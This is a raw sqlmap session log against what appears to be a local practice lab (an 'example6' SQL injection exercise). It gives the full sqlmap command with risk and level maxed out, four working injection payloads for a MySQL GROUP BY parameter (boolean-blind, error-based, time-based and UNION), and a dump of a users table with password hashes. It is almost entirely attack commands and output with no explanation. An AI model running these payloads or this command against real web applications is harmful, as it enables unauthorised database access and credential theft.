=================================================================================
sqlmap -u "http://192.168.17.134/sqlinjection/example6/?group=username" -p group --dump --risk=3 --level=5

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
GET parameter 'group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
what dictionary do you want to use? 1 (default dictionary)
do you want to use common password suffixes? (slow!) [y/N] n
=================================================================================
sqlmap identified the following injection point(s) with a total of 667 HTTP(s) requests:
---
Parameter: group (GET)
    Type: boolean-based blind
    Title: HAVING boolean-based blind - WHERE, GROUP BY clause
    Payload: group=username HAVING 3551=3551

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: group=username AND (SELECT 3708 FROM(SELECT COUNT(*),CONCAT(0x7170627171,(SELECT (ELT(3708=3708,1))),0x71716a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: group=username AND (SELECT 7950 FROM (SELECT(SLEEP(5)))ACzU)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: group=username UNION ALL SELECT CONCAT(0x7170627171,0x766b64436a4f6f6d76774272636549526b59444563556d736c56704370494d626d44445551704c4b,0x71716a7171),NULL,NULL-- -
---
web server operating system: Linux Debian 6 (squeeze)
web application technology: Apache 2.2.16
back-end DBMS: MySQL >= 5.0
Database: sqlinjection_example6
Table: users
[13 entries]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | b9c0c04f409ba647e781dcbe933ee5f3 | user1    |
| 2  | b9c0c04f409ba647e781dcbe933ee5f3 | user1    |
| 3  | b9c0c04f409ba647e781dcbe933ee5f3 | user2    |
| 4  | b9c0c04f409ba647e781dcbe933ee5f3 | user2    |
| 5  | b9c0c04f409ba647e781dcbe933ee5f3 | user2    |
| 6  | b9c0c04f409ba647e781dcbe933ee5f3 | user2    |
| 7  | b9c0c04f409ba647e781dcbe933ee5f3 | user3    |
| 8  | b9c0c04f409ba647e781dcbe933ee5f3 | user2    |
| 9  | b9c0c04f409ba647e781dcbe933ee5f3 | user2    |
| 10 | b9c0c04f409ba647e781dcbe933ee5f3 | user2    |
| 11 | b9c0c04f409ba647e781dcbe933ee5f3 | user4    |
| 12 | b9c0c04f409ba647e781dcbe933ee5f3 | user4    |
| 13 | b9c0c04f409ba647e781dcbe933ee5f3 | user4    |
+----+----------------------------------+----------+

